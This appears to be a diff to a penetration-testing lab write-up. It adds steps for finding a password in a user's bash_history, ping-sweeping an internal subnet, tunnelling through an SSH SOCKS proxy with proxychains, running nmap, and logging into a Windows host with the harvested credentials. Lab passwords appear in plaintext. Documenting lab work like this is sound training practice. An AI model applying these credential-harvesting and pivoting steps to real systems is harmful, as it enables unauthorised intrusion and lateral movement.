@@ -10,9 +10,11 @@
 
 - [x] Foothold (initial access) — SSH brute force
 - [x] Local enumeration — Linux system, dual NICs, no sudo
-- [ ] Pivot to internal network (172.16.119.0/24)
-- [ ] Password attacks (local or remote)
-- [ ] Privilege escalation
+- [x] Credential discovered in bash_history — `hwilliam / dealer-screwed-gym1`
+- [x] Internal network discovered — file01 at 172.16.119.11 (Windows)
+- [ ] Pivot to file01 and scan
+- [ ] Access file01 with discovered credentials
+- [ ] Privilege escalation on file01
 - [ ] Flag(s)
 
 ---
@@ -72,7 +74,82 @@ echo $SHELL
 
 ---
 
-## 3. Privilege Escalation
+## 2. Local Enumeration
+
+### Enumeration Summary
+- **Kernel:** Linux 5.4.0-216-generic (Ubuntu)
+- **SUDO:** No sudo access for jbetty
+- **SUID binaries:** Standard system binaries only (no custom SUID)
+- **Cron jobs:** Standard Ubuntu crons (e2scrub_all, popularity-contest) — not exploitable
+
+### Key Finding: Credential in Bash History
+```bash
+cat /home/jbetty/.bash_history | grep sshpass
+# sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01
+```
+
+**Discovered Credentials:**
+| Field | Value |
+|-------|-------|
+| Username | `hwilliam` |
+| Password | `dealer-screwed-gym1` |
+| Target Host | `file01` (internal, likely 172.16.119.x) |
+
+### Pivoting Strategy
+DMZ01 has dual NICs with access to internal network `172.16.119.0/24`. The `file01` host is likely in this range.
+
+**Next Steps:**
+1. Scan internal network to locate file01
+2. Use discovered credentials to SSH into file01
+3. Look for privilege escalation or flags on file01
+
+---
+
+## 3. Pivoting to Internal Network
+
+### Internal Network Discovery
+**Ping sweep from DMZ01:**
+```bash
+for i in $(seq 1 254); do ping -c1 -W1 172.16.119.$i & done 2>/dev/null | grep "bytes from"
+```
+
+**Results:**
+| Host | IP | TTL | OS |
+|------|-----|-----|-----|
+| DMZ01 (self) | 172.16.119.13 | 64 | Linux |
+| **file01** | **172.16.119.11** | 128 | **Windows** |
+
+TTL 128 indicates Windows operating system.
+
+### Pivot Setup
+Since DMZ01 has no nmap, we route traffic through it using SSH SOCKS proxy.
+
+**Step 1 — Create SOCKS tunnel (on attack host):**
+```bash
+ssh -D 9050 jbetty@10.129.234.116
+# Password: Texas123!@#
+```
+
+**Step 2 — Configure proxychains (on attack host):**
+```bash
+sudo vim /etc/proxychains.conf
+# Add under [ProxyList]: socks4 127.0.0.1 9050
+```
+
+**Step 3 — Scan internal target:**
+```bash
+sudo proxychains -q nmap -sT -Pn 172.16.119.11 --open
+```
+
+**Step 4 — Access file01 with discovered credentials:**
+```bash
+proxychains ssh hwilliam@172.16.119.11
+# Password: dealer-screwed-gym1
+```
+
+---
+
+## 4. Post-Exploitation
 
 ### Techniques
 
